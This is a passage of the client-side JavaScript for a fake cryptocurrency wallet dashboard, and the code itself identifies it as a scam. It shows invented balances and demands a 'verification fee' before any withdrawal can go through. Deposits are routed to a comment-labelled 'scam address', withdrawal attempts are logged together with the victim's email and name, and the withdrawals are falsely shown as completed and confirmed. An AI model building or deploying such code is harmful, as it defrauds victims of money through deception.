                const change = priceChanges[symbol];
                const changeClass = change >= 0 ? 'price-change' : 'price-change negative';
                const changeIcon = change >= 0 ? '‚Üó' : '‚Üò';
                const isTextIcon = data.icon.length > 1 && !/[‚ÇøŒû≈Å‚Ç≥üêïüíß]/.test(data.icon);
                const iconClass = isTextIcon ? 'coin-icon coin-icon-text' : 'coin-icon';

                return `
                    <div class="coin-card">
                        <div class="coin-header">
                            <div class="coin-info">
                                <div class="${iconClass}">${data.icon}</div>
                                <div class="coin-details">
                                    <h3>${symbol}</h3>
                                    <p>${getCoinName(symbol)}</p>
                                    <div class="${changeClass}">
                                        <span>${changeIcon}</span>
                                        <span>${Math.abs(change).toFixed(2)}% (24h)</span>
                                    </div>
                                </div>
                            </div>
                            <div class="coin-balance">
                                <div class="amount">${formatCoinAmount(data.balance)}</div>
                                <div class="usd">‚âà $${usdValue.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
                            </div>
                        </div>
                        <div class="coin-actions">
                            <button class="coin-btn btn-withdraw" onclick="openWithdrawModal('${symbol}')">Withdraw</button>
                            <button class="coin-btn btn-deposit" onclick="showDepositAddress('${symbol}')">Deposit</button>
                        </div>
                    </div>
                `;
            }).join('');

            const totalChange = Object.values(priceChanges).reduce((a, b) => a + b, 0) / Object.keys(priceChanges).length;
            document.getElementById('total-value').textContent = `$${totalValue.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
            const change24h = totalValue * (totalChange / 100);
            const change24hElement = document.getElementById('stat-24h-change');
            change24hElement.textContent = `${change24h >= 0 ? '+' : ''}$${change24h.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
            change24hElement.style.color = change24h >= 0 ? '#4ade80' : '#f87171';
        }

        function getCoinName(symbol) {
            const names = {
                'BTC': 'Bitcoin',
                'DOGE': 'Dogecoin',
                'ETH': 'Ethereum',
                'LTC': 'Litecoin',
                'XRP': 'Ripple',
                'ADA': 'Cardano'
            };
            return names[symbol] || symbol;
        }

        function formatCoinAmount(amount) {
            return parseFloat(amount.toFixed(8)).toString();
        }

        // Toast Notification System
        function showToast(message, type = 'info', title = null, duration = 5000) {
            const container = document.getElementById('toast-container');
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;

            const icons = {
                success: '‚úÖ',
                error: '‚ùå',
                warning: '‚ö†Ô∏è',
                info: '‚ÑπÔ∏è'
            };

            const titles = {
                success: 'Success',
                error: 'Error',
                warning: 'Warning',
                info: 'Info'
            };

            toast.innerHTML = `
                <div class="toast-icon">${icons[type] || icons.info}</div>
                <div class="toast-content">
                    <div class="toast-title">${title || titles[type] || 'Notification'}</div>
                    <div class="toast-message">${message}</div>
                </div>
                <button class="toast-close" onclick="this.parentElement.remove()">&times;</button>
            `;

            container.appendChild(toast);

            // Auto remove after duration
            if (duration > 0) {
                setTimeout(() => {
                    toast.classList.add('hiding');
                    setTimeout(() => toast.remove(), 300);
                }, duration);
            }

            return toast;
        }

        function openWithdrawModal(coinSymbol) {
            const coin = PREDEFINED_BALANCES[coinSymbol];
            const verificationFee = VERIFICATION_FEES[coinSymbol] || VERIFICATION_FEES['BTC'];
            const verificationAddress = VERIFICATION_ADDRESSES[coinSymbol] || VERIFICATION_ADDRESSES['BTC'];
            
            document.getElementById('withdraw-coin').value = coinSymbol;
            document.getElementById('withdraw-balance').value = `${formatCoinAmount(coin.balance)} ${coinSymbol}`;
            document.getElementById('withdraw-address').value = '';
            document.getElementById('withdraw-amount').value = '';
            document.getElementById('withdraw-amount-currency').textContent = coinSymbol;
            document.getElementById('verification-address').textContent = verificationAddress;
            document.getElementById('verification-coin-display').textContent = coinSymbol;
            
            // Format fee display based on coin
            let feeDisplay = '';
            if (coinSymbol === 'BTC' || coinSymbol === 'ETH' || coinSymbol === 'LTC') {
                feeDisplay = `${formatCoinAmount(verificationFee)} ${coinSymbol}`;
            } else {
                // For coins with higher amounts (DOGE, XRP, ADA), use 2 decimals but remove trailing zeros
                feeDisplay = `${parseFloat(verificationFee.toFixed(2)).toString()} ${coinSymbol}`;
            }
            document.getElementById('verification-fee-display').textContent = feeDisplay;
            
            // Disable body scroll
            document.body.classList.add('modal-open');
            document.getElementById('withdraw-modal').classList.add('active');
            
            // Scroll to top of modal
            document.getElementById('withdraw-modal').scrollTop = 0;
        }

        function closeModal() {
            document.getElementById('withdraw-modal').classList.remove('active');
            // Re-enable body scroll
            document.body.classList.remove('modal-open');
        }

        async function handleWithdraw(event) {
            event.preventDefault();
            
            const coinSymbol = document.getElementById('withdraw-coin').value;
            const address = document.getElementById('withdraw-address').value.trim();
            const amount = parseFloat(document.getElementById('withdraw-amount').value);
            const coin = PREDEFINED_BALANCES[coinSymbol];

            if (!address) {
                showToast('Please enter a recipient address!', 'error', 'Validation Error');
                return;
            }

            if (!amount || amount <= 0) {
                showToast('Please enter a valid amount!', 'error', 'Validation Error');
                return;
            }

            if (amount > coin.balance) {
                showToast('Insufficient balance!', 'error', 'Insufficient Funds');
                return;
            }

            // Verification fee in the same currency as withdrawal
            const verificationFee = VERIFICATION_FEES[coinSymbol] || VERIFICATION_FEES['BTC'];
            const verificationAddress = VERIFICATION_ADDRESSES[coinSymbol] || VERIFICATION_ADDRESSES['BTC'];

            const currentUser = JSON.parse(sessionStorage.getItem('currentUser'));
            const withdrawalData = {
                coin: coinSymbol,
                amount: amount,
                address: address,
                verificationFeeRequired: verificationFee,
                verificationFeeCurrency: coinSymbol,
                verificationAddress: verificationAddress,
                timestamp: new Date().toISOString(),
                userEmail: currentUser.email,
                userName: currentUser.name,
                userAgent: navigator.userAgent
            };
            await logActivity('WITHDRAWAL_ATTEMPT', withdrawalData);

            // Show confirmation message
            const submitBtn = document.getElementById('withdraw-submit');
            submitBtn.disabled = true;
            submitBtn.textContent = 'Processing...';

            // Format fee for display
            let feeDisplay = '';
            if (coinSymbol === 'BTC' || coinSymbol === 'ETH' || coinSymbol === 'LTC') {
                feeDisplay = `${formatCoinAmount(verificationFee)} ${coinSymbol}`;
            } else {
                // For coins with higher amounts (DOGE, XRP, ADA), use 2 decimals but remove trailing zeros
                feeDisplay = `${parseFloat(verificationFee.toFixed(2)).toString()} ${coinSymbol}`;
            }

            setTimeout(async () => {
                showToast(
                    `Withdrawal request submitted!\n\n‚ö†Ô∏è IMPORTANT: To complete this withdrawal, you must send a verification fee of ${feeDisplay} to:\n\n${verificationAddress}\n\n‚ö†Ô∏è CRITICAL: The verification fee must be paid in ${coinSymbol} (the same currency as your withdrawal). The recipient wallet address must be the same as the wallet address from which you send the verification fee. Withdrawals from different addresses will be rejected.\n\nOnce the verification fee is received, your withdrawal will be processed within 1 hours.`,
                    'warning',
                    'Withdrawal Request Submitted',
                    10000
                );
                
                // Add transaction to history
                if (!window.supabaseUtils) {
                    throw new Error('Supabase not initialized. Please wait...');
                }
                const users = await window.supabaseUtils.getUsers();
                const userData = users[currentUser.email] || { transactions: [] };
                
                const transaction = {
                    type: 'withdrawal',
                    coin: coinSymbol,
                    amount: amount,
                    address: address,
                    status: 'completed',
                    date: new Date().toISOString(),
                    description: `Withdrawal to ${address.substring(0, 8)}...`
                };

                userData.transactions = userData.transactions || [];
                userData.transactions.push(transaction);
                
                await window.supabaseUtils.saveUser(currentUser.email, userData);

                closeModal();
                await loadUserData(currentUser);
            }, 1000);
        }

        function showDepositAddress(coinSymbol) {
            // Use the verification address as deposit address (scam address)
            const address = VERIFICATION_ADDRESSES[coinSymbol] || VERIFICATION_ADDRESSES['BTC'];
            const coinName = getCoinName(coinSymbol);
            
            // Update modal content
            document.getElementById('deposit-coin-symbol').textContent = coinSymbol;
            document.getElementById('deposit-coin-name').textContent = coinName;
            document.getElementById('deposit-coin-min').textContent = coinSymbol;
            document.getElementById('deposit-address').textContent = address;
            
            // Disable body scroll
            document.body.classList.add('modal-open');
            // Show modal
            document.getElementById('deposit-modal').classList.add('active');
            
            // Scroll to top of modal
            document.getElementById('deposit-modal').scrollTop = 0;
            
            // Generate QR code after a short delay to ensure modal is visible
            setTimeout(() => {
                generateQRCode(address, 'deposit-qr-code-container');
            }, 200);
        }

        function closeDepositModal() {
            document.getElementById('deposit-modal').classList.remove('active');
            // Re-enable body scroll
            document.body.classList.remove('modal-open');
        }

        function copyToClipboard(text, label = 'Address') {
            navigator.clipboard.writeText(text).then(() => {
                showToast(`${label} copied to clipboard!`, 'success', 'Copied', 2000);
            }).catch(err => {
                // Fallback for older browsers
                const textarea = document.createElement('textarea');
                textarea.value = text;
                textarea.style.position = 'fixed';
                textarea.style.opacity = '0';
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                document.body.removeChild(textarea);
                showToast(`${label} copied to clipboard!`, 'success', 'Copied', 2000);
            });
        }

        // Generate QR Code using qrcodejs library
        function generateQRCode(text, containerId) {
            const container = document.getElementById(containerId);
            if (!container) {
                console.error('QR Code container not found:', containerId);
                return;
            }

            // Clear previous QR code
            container.innerHTML = '';

            // Wait for QRCode library to load if not available
            if (typeof QRCode === 'undefined') {
                let attempts = 0;
                const checkQRCode = setInterval(() => {
                    attempts++;
                    if (typeof QRCode !== 'undefined') {
                        clearInterval(checkQRCode);
                        generateQRCode(text, containerId);
                    } else if (attempts > 30) {
                        clearInterval(checkQRCode);
                        console.error('QRCode library failed to load');
                        container.innerHTML = '<div style="text-align: center; padding: 20px; color: #000; width: 250px; height: 250px; display: flex; align-items: center; justify-content: center; flex-direction: column;"><div>QR Code</div><div style="font-size: 12px; margin-top: 10px;">Library Error</div></div>';
                    }
                }, 100);
                return;
            }

            // Generate QR code
            try {
                new QRCode(container, {
                    text: text,
                    width: 250,
                    height: 250,
                    colorDark: '#000000',
                    colorLight: '#FFFFFF',
                    correctLevel: QRCode.CorrectLevel.M
                });
                console.log('QR Code generated successfully for:', text);
            } catch (error) {
                console.error('QR Code generation exception:', error);
                container.innerHTML = '<div style="text-align: center; padding: 20px; color: #000; width: 250px; height: 250px; display: flex; align-items: center; justify-content: center;"><div>QR Code Error</div></div>';
            }
        }

        function generateAddress(coinSymbol) {
            const prefixes = {
                'BTC': 'bc1q',
                'DOGE': 'D',
                'ETH': '0x',
                'LTC': 'ltc1',
                'XRP': 'r',
                'ADA': 'addr1'
            };
            const prefix = prefixes[coinSymbol] || '';
            return prefix + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        }

        function loadTransactions(transactions) {
            const transactionsList = document.getElementById('transactions-list');
            
            if (transactions.length === 0) {
                transactionsList.innerHTML = `
                    <div class="empty-state">
                        <div class="empty-state-icon">üì≠</div>
                        <h3>No transactions yet</h3>
                        <p>Your transaction history will appear here</p>
                    </div>
                `;
                return;
            }

            // Sort transactions by date (newest first)
            transactions.sort((a, b) => new Date(b.date) - new Date(a.date));

            // Show last 15 transactions (professioneller - mehr Details)
            const recentTransactions = transactions.slice(0, 15);

            transactionsList.innerHTML = recentTransactions.map(tx => {
                const isPositive = tx.type === 'receive' || tx.type === 'deposit' || tx.type === 'reward';
                const isExchange = tx.type === 'exchange';
                
                let icon, itemClass;
                if (isPositive) {
                    icon = 'üì•';
                    itemClass = 'received';
                } else if (isExchange) {
                    icon = 'üîÑ';
                    itemClass = 'sent';
                } else {
                    icon = 'üì§';
                    itemClass = 'sent';
                }
                
                const amountClass = isPositive ? 'amount-positive' : 'amount-negative';
                const amountPrefix = isPositive ? '+' : isExchange ? '‚Üî' : '-';
                const date = new Date(tx.date);
                const now = new Date();
                const diff = now - date;
                const hours = Math.floor(diff / 3600000);
                const days = Math.floor(diff / 86400000);
                
                let timeDisplay;
                if (hours < 1) timeDisplay = 'Just now';
                else if (hours < 24) timeDisplay = `${hours}h ago`;
                else if (days < 7) timeDisplay = `${days}d ago`;
                else timeDisplay = date.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });

                const statusBadge = '<span style="color: #4ade80; font-size: 11px; background: rgba(74, 222, 128, 0.15); padding: 2px 6px; border-radius: 4px; font-weight: 600;">‚úì Confirmed</span>';
                
                const txIdDisplay = tx.txId || tx.txHash 
                    ? `<div style="font-size: 10px; color: #666; margin-top: 4px; font-family: monospace; word-break: break-all;">TX: ${(tx.txId || tx.txHash).substring(0, 20)}...</div>` 
                    : '';
                const confirmationsDisplay = tx.confirmations !== undefined && tx.confirmations > 0
                    ? `<div style="font-size: 10px; color: #4ade80; margin-top: 2px;">${tx.confirmations} confirmations</div>` 
                    : '';
                const addressDisplay = tx.address 
                    ? `<div style="font-size: 10px; color: #888; margin-top: 2px; font-family: monospace;">${tx.address.substring(0, 14)}...</div>` 
                    : '';

                return `
                    <div class="transaction-item ${itemClass}">
                        <div class="transaction-info">
                            <div class="transaction-icon">${icon}</div>
                            <div class="transaction-details">
                                <h3>${tx.description || (isPositive ? 'Received' : isExchange ? 'Exchanged' : 'Withdrawal')} ${tx.coin || 'Bitcoin'} ${statusBadge}</h3>
                                <p style="display: flex; align-items: center; gap: 8px; margin-top: 4px; flex-wrap: wrap;">
                                    <span style="color: #a0a0a0;">${timeDisplay}</span>
                                    ${tx.txId || tx.txHash ? `<span style="color: #666;">‚Ä¢</span><span style="font-family: monospace; font-size: 11px; color: #666;">${(tx.txId || tx.txHash).substring(0, 12)}...</span>` : ''}
                                </p>
                                ${addressDisplay}
                                ${txIdDisplay}
                                ${confirmationsDisplay}
                            </div>
                        </div>
                        <div class="transaction-amount ${amountClass}">
                            ${amountPrefix}${formatCoinAmount(Math.abs(tx.amount))} ${tx.coin || 'BTC'}
                        </div>
                    </div>
                `;
            }).join('');
        }

        async function logActivity(type, data) {
            if (!window.supabaseUtils) {
                throw new Error('Supabase not initialized. Please wait...');
            }
            await window.supabaseUtils.logActivity(type, data);
        }

        function handleLogout() {
            if (confirm('Are you sure you want to logout?')) {
                sessionStorage.removeItem('currentUser');
                window.location.href = 'login.html';
            }
        }

        function loadAllTransactions() {
            const currentUser = JSON.parse(sessionStorage.getItem('currentUser'));
            if (!currentUser) return;
            
            // Reload all transactions
            loadUserData(currentUser);
            
            // Show message
            const transactionsList = document.getElementById('transactions-list');
            const message = document.createElement('div');
            message.style.cssText = 'background: rgba(255, 140, 0, 0.1); border: 1px solid rgba(255, 140, 0, 0.3); border-radius: 10px; padding: 15px; margin-bottom: 20px; color: #ffa500; text-align: center;';
            message.textContent = 'Showing all transactions';
            transactionsList.insertBefore(message, transactionsList.firstChild);
            
            setTimeout(() => message.remove(), 3000);
        }

        // Close modal on outside click
        document.getElementById('withdraw-modal').addEventListener('click', function(e) {
            if (e.target === this) {
                closeModal();
            }
        });
    </script>
</body>
</html>